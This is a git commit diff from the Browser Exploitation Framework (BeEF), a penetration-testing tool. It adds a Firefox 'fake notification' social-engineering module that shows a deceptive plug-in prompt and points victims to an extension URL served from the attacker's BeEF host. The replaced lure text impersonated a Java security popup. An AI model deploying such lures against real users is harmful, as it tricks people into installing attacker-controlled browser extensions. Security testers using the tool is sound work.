b16d7e3563443678149bdaf91bca9d78c5815909
bcoles <bcoles@gmail.com>
2013-07-04 23:12:01 +0930

    Add fake_notification_ff module
    Rename fake_notification module to fake_notification_ie

--- modules/social_engineering/fake_notification_ff/module.rb
+++ modules/social_engineering/fake_notification_ff/module.rb
@@ -3,14 +3,18 @@
 # Browser Exploitation Framework (BeEF) - http://beefproject.com
 # See the file 'doc/COPYING' for copying permission
 #
-class Fake_notification < BeEF::Core::Command
+class Fake_notification_ff < BeEF::Core::Command
 
   def self.options
+    @configuration = BeEF::Core::Configuration.instance
+    beef_host = @configuration.get("beef.http.public") || @configuration.get("beef.http.host")
+    url = 'http://' + beef_host + ':' + @configuration.get("beef.http.port") +'/api/ipec/ff_extension'
     return [
+      {'name' => 'url', 'ui_label' => 'Plugin URL', 'value' => url, 'width'=>'150px'},
       { 'name' => 'notification_text',
         'description' => 'Text displayed in the notification bar',
-        'ui_label' => 'Text displayed in the notification bar',
-        'value' => "This website wants to run the following applet: \\'Java\\' from \\'Microsoft Inc\\'. To continue using this website you must accept the following security popup"
+        'ui_label' => 'Notification text',
+        'value' => "An additional plug-in is required to display some elements on this page."
       }
     ]
   end
